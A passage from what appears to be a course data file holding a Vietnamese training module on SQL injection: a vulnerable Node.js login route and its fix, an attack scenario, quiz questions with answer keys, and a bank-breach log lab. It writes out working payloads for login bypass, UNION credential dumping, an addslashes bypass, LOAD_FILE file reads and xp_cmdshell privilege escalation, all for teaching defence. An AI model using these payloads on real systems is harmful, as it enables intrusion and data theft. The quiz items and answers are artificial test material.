MySQL)\n\n\`\`\`javascript\nconst express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst db = mysql.createConnection({\n  host: 'localhost', user: 'root', password: 'password123', database: 'shop'\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";\n  db.query(query, (err, rows) => {\n    if (rows.length > 0) {\n      res.json({ success: true, user: rows[0] });\n    } else {\n      res.json({ success: false });\n    }\n  });\n});\n\`\`\`\n\n**Phân tích từng dòng tại sao nguy hiểm:**\n- **req.body**: Dữ liệu từ client hoàn toàn KHÔNG ĐÁNG TIN.\n- **String Concatenation**: Biến username và password nối trực tiếp vào SQL — đây là cửa ngõ SQLi.\n- **db.query(query)**: Query thực thi ngay, không qua sanitization.\n- **rows.length > 0**: Trả về success nếu có bất kỳ row nào — kể cả kết quả từ payload.\n\n**Khai thác**: Username: \`admin' --\`, Password: \`anything\` → \`SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'\` → Bypass authentication.\n\n#### ĐOẠN CODE ĐÃ VÁ LỖI (REMEDIATED)\n\n\`\`\`javascript\nconst express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst db = mysql.createConnection({\n  host: 'localhost', user: 'app_user', password: 'Str0ng!P@ss', database: 'shop'\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (typeof username !== 'string' || typeof password !== 'string') {\n    return res.status(400).json({ error: 'Invalid input type' });\n  }\n  const stmt = 'SELECT * FROM users WHERE username = ? AND password = ?';\n  db.execute(stmt, [username, password], (err, rows) => {\n    if (err) { console.error('DB error:', err.code); return res.status(500).json({ error: 'Internal error' }); }\n    if (rows.length > 0) {\n      const safeUser = { id: rows[0].id, username: rows[0].username };\n      res.json({ success: true, user: safeUser });\n    } else { res.json({ success: false }); }\n  });\n});\n\`\`\`\n\n**Tại sao Prepared Statements ngăn được SQLi?**\nSQL template được compile trước thành execution plan tại Database engine. Sau đó dữ liệu chỉ là tham số thuần túy, không thể thay đổi cấu trúc câu SQL.\n\n### Kịch bản Tấn công/Phòng thủ trong Đời thực\n\n#### Tình huống: Công ty thương mại điện tử "ShopMax" bị tấn công\n\n**Bối cảnh**: ShopMax là startup thương mại điện tử dùng Node.js + MySQL, tính năng search cho phép nhập từ khóa.\n\n**Phase 1: Reconnaissance**\nHacker gõ dấu nháy đơn (\`) vào ô tìm kiếm → Server trả về: \`Database Error: syntax error\` → Xác nhận có SQLi + Information Disclosure.\n\n**Phase 2: Enumeration**\n\`' UNION SELECT 1,2,3,4 --\` → Phát hiện 4 cột, vị trí 2 và 3 hiển thị ra web.\n\n**Phase 3: Data Exfiltration**\n\`' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users --\` → Thu thập 15,000 tài khoản.\n\n**Phase 4: Hậu quả**\n12,340 mật khẩu bị crack (MD5 không muối), 3,420 tài khoản trùng email công ty, 1 CEO bị hack Gmail. Thiệt hại $2.4M.\n\n#### Blue Team Response\n\n**Phát hiện qua SIEM:**\n1. IDS Alert: SQLi pattern trên /search từ IP 185.220.101.x (TOR)\n2. WAF Alert: Request spike — 2,250 req/phút (bình thường 5 req/phút)\n3. Database Log: SELECT UNION trên table users\n\n**Phân tích Log:**\n- Correlate 3 alerts → Pattern rõ ràng: SQLi trên /search\n- Web server log cho thấy 3 request: test → enum cột → dump users\n\n**Containment:**\n- WAF rule block UNION SELECT + INFORMATION_SCHEMA\n- Enable Prepared Statements ngay\n- Block IP range tại firewall\n\n**Eradication:**\n- Code review → 47 endpoint dùng string concatenation\n- Patch toàn bộ với Parameterized Queries\n- Tắt database error display\n\n---\n## PHẦN 2: NGÂN HÀNG CÂU HỎI ĐA TẦNG\n\n### CÂU 1 (Dễ)\n**SQL Injection là gì?**\n\nA. Kỹ thuật đánh cắp session cookie\nB. Kỹ thuật chèn mã SQL qua input người dùng để thao túng database\nC. Kỹ thuật giả mạo địa chỉ IP\nD. Kỹ thuật gửi request ồ ạt làm sập server\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: SQLi chèn câu lệnh SQL vào input để thay đổi behavior query gốc.\n- ❌ **A sai**: Session hijacking là XSS, không phải SQLi.\n- ❌ **C sai**: IP Spoofing ở tầng Network, không liên quan Database.\n- ❌ **D sai**: Đó là DoS/DDoS, SQLi nhắm vào dữ liệu.\n\n### CÂU 2 (Dễ)\n**Ký tự nào thường dùng test SQL Injection?**\n\nA. Dấu ngoặc kép "\nB. Dấu nháy đơn '\nC. Dấu chấm phẩy ;\nD. Dấu gạch chéo /\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: Dấu nháy đơn thoát khỏi string context trong SQL — test đầu tiên ("The Single Quote Test").\n- ❌ **A sai**: MySQL mặc định coi ngoặc kép là identifier quote.\n- ❌ **C sai**: Stacked queries thường bị driver chặn.\n- ❌ **D sai**: Dùng trong path traversal, không test SQLi.\n\n### CÂU 3 (Dễ)\n**Cách phòng chống SQL Injection hiệu quả nhất?**\n\nA. Validate input chặn ký tự đặc biệt\nB. Prepared Statements (Parameterized Queries)\nC. Mã hóa dữ liệu trước khi lưu\nD. Dùng WAF\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: Prepared Statements tách code khỏi dữ liệu ở cấp database engine.\n- ❌ **A sai**: Blacklist luôn thất bại (encoding bypass, Unicode, CHAR()).\n- ❌ **C sai**: Encryption bảo vệ dữ liệu lưu trữ, không ngăn SQLi.\n- ❌ **D sai**: WAF có thể bypass, là lớp phòng thủ bổ sung.\n\n### CÂU 4 (Trung bình)\n**Cho code PHP: $sql = "SELECT * FROM products WHERE id = " . $id;. Payload nào lấy users từ bảng users?**\n\nA. 1 OR 1=1\nB. 1 UNION SELECT * FROM users\nC. 1; SELECT * FROM users\nD. 1 UNION SELECT username, password FROM users\n\n**Đáp án đúng: D**\n\n**Giải thích:**\n- ✅ **D đúng**: UNION kết hợp kết quả 2 SELECT. Cần match số cột.\n- ❌ **A sai**: OR 1=1 trả về tất cả products, không lấy users.\n- ❌ **B sai**: UNION yêu cầu số cột bằng nhau.\n- ❌ **C sai**: mysqli_query() không hỗ trợ stacked queries.\n\n### CÂU 5 (Trung bình)\n**Log web server: GET /product?id=1 (4520B), GET /product?id=1%20OR%201%3D1 (8920B), GET /product?id=1%20UNION%20SELECT%201%2C2%2C3 (5120B), GET /product?id=1%20UNION%20SELECT%20table_name%2C2%2C3%20FROM%20information_schema.tables (18650B). Điều gì xảy ra?**\n\nA. Crawl bình thường của Googlebot\nB. Attacker khai thác Blind SQL Injection\nC. Attacker khai thác Union-based SQL Injection — response tăng dần chứng tỏ data bị exfiltrate\nD. Tấn công DDoS\n\n**Đáp án đúng: C**\n\n**Giải thích:**\n- ✅ **C đúng**: Pattern rõ: Test → OR 1=1 → Xác định cột → Dump tables. Response size tăng theo payload.\n- ❌ **A sai**: Googlebot không gửi OR 1=1 hay UNION SELECT.\n- ❌ **B sai**: Blind SQLi có response tương tự nhau, không tăng vọt.\n- ❌ **D sai**: 4 request không phải DDoS.\n\n### CÂU 6 (Trung bình)\n**Blind SQLi khác Union-based SQLi ở điểm nào?**\n\nA. Blind SQLi chỉ hoạt động trên MySQL\nB. Blind SQLi không nhìn thấy dữ liệu trực tiếp — suy luận qua true/false hoặc time delay\nC. Blind SQLi nhanh hơn Union-based\nD. Blind SQLi chỉ qua POST request\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: Blind SQLi đặt câu hỏi YES/NO, extract từng ký tự. Rất chậm nhưng hiệu quả khi không có output.\n- ❌ **A sai**: Blind SQLi tồn tại trên mọi database.\n- ❌ **C sai**: Blind SQLi CHẬM hơn nhiều (cần 256+ request cho 32 ký tự hash).\n- ❌ **D sai**: Khai thác qua cả GET và POST.\n\n### CÂU 7 (Trung bình)\n**Code Python Flask: query = f"SELECT username, email FROM users WHERE id = {user_id}". Lỗi gì?**\n\nA. Không có lỗi — SQLite tự chống SQLi\nB. Path Traversal\nC. SQL Injection — f-string nối user_id trực tiếp vào SQL\nD. XSS\n\n**Đáp án đúng: C**\n\n**Giải thích:**\n- ✅ **C đúng**: F-string tương tự nối chuỗi. Payload ?id=1 UNION SELECT username,password FROM users.\n- ❌ **A sai**: SQLite không có cơ chế tự vệ.\n- ❌ **B sai**: Path Traversal liên quan file paths.\n- ❌ **D sai**: JSON response không bị XSS.\n\n### CÂU 8 (Khó)\n**Developer nói: "Tôi dùng addslashes() trong PHP nên code an toàn." Nhận định này?**\n\nA. Đúng — addslashes() chuyển ' thành \\'\nB. Sai — addslashes() không xử lý number context và có thể bị bypass với charset GBK/BIG5\nC. Đúng — PHP có magic quotes\nD. Sai — cần dùng htmlspecialchars() thay thế\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: Number context (WHERE id=$id) — không có quotes nên addslashes vô dụng. Multibyte bypass: %bf%5c%27 (GBK) nuốt backslash.\n- ❌ **A sai**: Không đủ bảo vệ.\n- ❌ **C sai**: Magic quotes deprecated từ PHP 5.4.\n- ❌ **D sai**: htmlspecialchars chống XSS, không liên quan SQL.\n\n### CÂU 9 (Khó)\n**Log SQL Server: EXEC xp_cmdshell 'whoami', SELECT * FROM sysobjects, SELECT * FROM sysusers, EXEC sp_addsrvrolemember 'user1','sysadmin'. Điều gì xảy ra?**\n\nA. DBA bảo trì định kỳ\nB. Attacker đang leo thang đặc quyền (privilege escalation) — critical\nC. Script backup tự động\nD. Brute force mật khẩu SA\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: xp_cmdshell (exec OS command) → sysobjects (liệt kê tables) → sysusers (list users) → sp_addsrvrolemember (thêm user vào sysadmin). Đây là privilege escalation.\n- ❌ **A sai**: DBA không dùng xp_cmdshell hay sp_addsrvrolemember thủ công.\n- ❌ **C sai**: Backup dùng BACKUP DATABASE.\n- ❌ **D sai**: Không có failed login attempts.\n\n### CÂU 10 (Khó)\n**Query: SELECT * FROM orders WHERE user_id = 1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 FROM users. Database user có FILE_PRIV. Payload cho phép làm gì?**\n\nA. Xóa file /etc/passwd\nB. Đọc nội dung /etc/passwd và hiển thị trong response web\nC. Chèn dữ liệu vào /etc/passwd\nD. Upload shell lên server\n\n**Đáp án đúng: B**\n\n**Giải thích:**\n- ✅ **B đúng**: LOAD_FILE() đọc file trên filesystem của database server. UNION kết hợp hiển thị ngay trong HTTP response.\n- ❌ **A sai**: LOAD_FILE chỉ đọc, không xóa.\n- ❌ **C sai**: Ghi file dùng INTO OUTFILE, không phải LOAD_FILE.\n- ❌ **D sai**: Upload cần INTO OUTFILE + web directory writable.\n\n---\n## PHẦN 3: ĐỀ THI CUỐI KHÓA THỰC CHIẾN (FINAL EXAM LAB)\n\n### "Vụ tấn công vào hệ thống E-Banking FastBank"\n\n**Bối cảnh**: Bạn là Senior Security Engineer của FastBank. 02:33 AM, hệ thống gửi alert. Phân tích timeline:\n\n\`\`\`\n02:33:01 [WAF] Blocked: SQLi | /api/v2/accounts/balance | payload: ' OR 1=1 --\n02:33:05 [WAF] Alert: Suspicious | /api/v2/accounts/balance | payload: 1 AND 1=1\n02:33:12 [WAF] Alert: Suspicious | /api/v2/accounts/balance | payload: 1 AND 1=2\n02:33:15 [WAF] Blocked: SQLi | /api/v2/users/search | payload: admin' --\n02:33:20 [WAF] Blocked: SQLi | /api/v2/users/search | payload: admin'+UNION+SELECT+1,2,3--\n02:33:22 [App] GET /api/v2/transactions/history?limit=10 200\n02:33:23 [App] GET /api/v2/transactions/history?limit=10+AND+1=1 200\n02:33:24 [App] GET /api/v2/transactions/history?limit=10+AND+1=2 200\n02:33:25 [App] GET /api/v2/transactions/history?limit=10+AND+(SELECT+SUBSTRING(@@version,1,1))='5' 200\n02:33:26 [App] GET /api/v2/transactions/history?limit=10+AND+(SELECT+SUBSTRING(@@version,1,1))='8' 200\n02:33:27 [App] GET /api/v2/transactions/history?limit=10+AND+(SELECT+current_user)='app_user@%' 200\n02:33:28 [App] ERROR | GET /api/v2/transactions/history?limit=10+AND+(SELECT+current_user)='root@%' 500\n02:33:30-02:34:30 [App] 142 requests Boolean-based blind injection\n02:35:31 [App] GET /api/v2/auth/reset-password?email=ceo@fastbank.com 200\n02:35:33 [Auth] Login SUCCESS | ceo@fastbank.com | MFA: BYPASSED\n02:35:35 [App] POST /api/v2/transactions/transfer | From: ceo | To: offshore | $2,450,000\n02:35:40 [App] POST /api/v2/transactions/transfer | From: ceo | To: offshore | $1,230,000\n\`\`\`\n\n**Chọn biện pháp khắc phục tối ưu NHẤT:**\n\nA. Block IP 185.220.101.23, reset password CEO, bật 2FA — đây là brute force.\n\nB. Tắt endpoint /api/v2/transactions/history, rollback 2 giao dịch CEO, xoay database credentials, fix SQLi ở parameter limit bằng Prepared Statements.\n\nC. Tăng WAF rules — WAF đã block được từ đầu.\n\nD. Restore database từ backup trước 02:33 — Blind SQLi có thể đã xóa dữ liệu.\n\n**Đáp án đúng: B**\n\n**Giải thích chi tiết:**\n\nPhân tích timeline:\n1. 02:33:01-20: WAF block SQLi trên /accounts/balance và /users/search. Attacker chuyển target.\n2. 02:33:22-28: Attacker khai thác Blind Boolean-based SQLi trên /transactions/history qua parameter limit (số nguyên — WAF không detect). Xác định MySQL 8.0.32, user app_user.\n3. 02:33:30-34:30: 142 requests extract database structure.\n4. 02:35:31: Attacker dùng email CEO (đã extract từ DB) để reset password — đây không phải brute force!\n5. 02:35:33-40: CEO không bật 2FA → attacker login + chuyển $3.68M.\n\n**Tại sao B tối ưu nhất:**\n- Tắt endpoint /transactions/history: Chặn vector tấn công ngay lập tức.\n- Rollback giao dịch: Ngăn thiệt hại tài chính.\n- Xoay credentials: Attacker đã extract DB version, user, tables.\n- Fix SQLi root cause: Prepared Statements cho parameter limit (số nguyên — tưởng an toàn nhưng không).\n\n- ❌ **A sai**: Không phải brute force. Attacker dùng password reset hợp pháp sau khi có email từ SQLi.\n- ❌ **C sai**: Sai lầm nguy hiểm — WAF chỉ block Union-based SQLi, Blind Boolean-based trên number context bypass hoàn toàn.\n- ❌ **D sai**: Blind SQLi chỉ READ, không DELETE/UPDATE. Không có dấu hiệu data modification. Restore gây downtime không cần thiết. Tổn thất do access control, không phải database integrity.`,
        estMinutes: 45,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Sau khi học xong module SQL Injection Chuyên sâu, bạn hiểu rõ nhất điều gì?",
          options: [
            "SQL Injection chỉ xảy ra khi có dấu nháy đơn trong input",
            "Prepared Statements là biện pháp phòng thủ duy nhất ở tầng database query",
            "WAF có thể bảo vệ hoàn toàn khỏi SQL Injection",
            "Blind SQL Injection và Union-based SQL Injection đều dùng cùng một kỹ thuật khai thác",
          ],
          correctAnswer: "Prepared Statements là biện pháp phòng thủ duy nhất ở tầng database query",
          explanation: "Prepared Statements tách biệt code SQL khỏi dữ liệu ở cấp độ database engine."
        }
      },
    ],
  },
];
